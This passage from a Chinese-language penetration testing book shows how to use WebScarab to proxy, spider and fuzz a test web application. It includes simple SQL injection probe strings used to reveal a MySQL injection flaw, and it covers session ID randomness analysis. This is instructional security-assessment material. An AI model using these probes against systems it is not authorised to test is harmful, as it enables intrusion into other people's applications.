上述指令將執行精簡版的 WebScarab。根據本例的需要，我們通過功能表 Tools | Use full-featured interface 令程式顯示全部的功能選項。程式將詢問您是否啟用這項功能，然後會重啟該應用程式。再次啟動之後，WebScarab的介面上將新增很多工具的選項卡。在開始評估工作之前，我們應調整流覽器程式，使其使用本地代理伺服器（127.0.0.1, 8080），以使得流覽器通過WebScarab 的攔截代理訪問目標主機。另外，您可以在Proxy | Listeners選項卡中調整本地代理伺服器的有關設置（IP位址或埠）。使用WebScarab程式分析目標應用程式的session ID 的步驟如下。

1. 設置好流覽器的代理伺服器選項之後，您可使用流覽器訪問目標網站（例如http://testphp.targetdomain.com/），並訪問盡可能多的連結。流覽的頁面越多，發現已知和未知漏洞的機會也就越大。除了這種方法，您還可在Summary選項卡中使用滑鼠右鍵點擊目標網站，然後選擇Spider tree；此後，程式將自動査找目標應用程式的所有可用連結。

2. 如果想檢查特定頁面的請求和回應資料，可按一下底部的Summary標籤。程式將表格的形式顯示原始的和解析過的流覽器請求。此外，您還可以看到以 HTML、XML、TEXT和Hex格式顯示的回應資訊。

3. 在測試過程中，我們決定對目標應用程式連結中的某個參數（例如，artist=l）以 GET 請求進行模糊測試。這種測試有助於找到未被發現的漏洞。我們使用滑鼠右鍵點擊選定的連結，並選擇Use as fuzz template。然後轉到Fuzzer 選項卡，點擊Parameters 附近的 Add 按鈕，人工添加需要進行模糊測試的參數。在本例中，我們寫了一個小型文字檔，這個檔含有已知的SQL 注入資料（例如，1 AND1=2、1AND1=1、單引號[’]），然後指定這個文字檔作為模糊測試的參數值。這種指定操作可通過Fuzzer選項卡下的Sources按鈕完成。準備好模糊測試資料後，我們點擊 Start 開始測試。所有測試完成後，可以按兩下單個請求以檢査其相應的回應。我們在本例中發現了MySQL注入漏洞。

Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1 Warning: mysql_fetch_array():supplied argument is not a valid MySQL result resource in /var/www/vhosts/default/htdocs/listproducts.php on line 74

4. 最後，我們分析目標應用程式的session ID。我們選中Session ID Analysis選項卡，並在下拉式列示方塊中選中Previous Requests。等程式載入了特定請求之後，我們在底部設定採樣次數（例如，20）。然後點擊Fetch 按鈕開始對session ID進行採樣。之後，點擊Test按鈕對樣本進行分析。而後，可在Analysis選項卡下看到分析結果。此外，我們可在 Visualization 選項卡屮看到相應的視覺化分析。這種分析用於判斷session ID 的雜化程度和不可預期性。上述指標如果不理想，就可能引發通過某session ID劫持他人session或獲取他人認證資訊的事故。

WebScarab 另有大量的選項和其他的功能，它們有助於我們提髙對滲透測試的認識。有關WebScarab 專案的更多資訊，請訪問http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project。

7.9 本章總結
本章通過Kali Linux 中的多款工具，闡述了識別和分析關鍵安全性漏洞的具體方法。有關篇幅介紹了安全性漏洞的三大類型：設計類漏洞、實施類漏洞和運營類漏洞，以及安全性漏洞的兩大種類：本地漏洞和遠端漏洞。然後，本文簡要介紹了幾種安全性漏洞的分類標準。這些標準依據缺陷的普遍共性對漏洞進行了總結，是安全審計人員所遵循的分類標準。為了指導漏洞評估的具體工作，本文列舉了幾款結合自動檢驗技術和手動檢驗技術的評估工具，並依據其特定的審計技術對這些工具進行了分類。本章介紹的工具有 OpenVAS（集合了所有功能的評估工具）、Cisco分析工具、模糊分析工具、SMB分析工具、SNMP工具和Web應用程式安全評估工具。

下一章將討論欺騙的藝術，即利用人性的弱點獲取目標資訊的各種方法。雖然並非每次評估工作都涉及這些工作，但在缺乏目標資訊時有關技術就顯得十分必要。

```
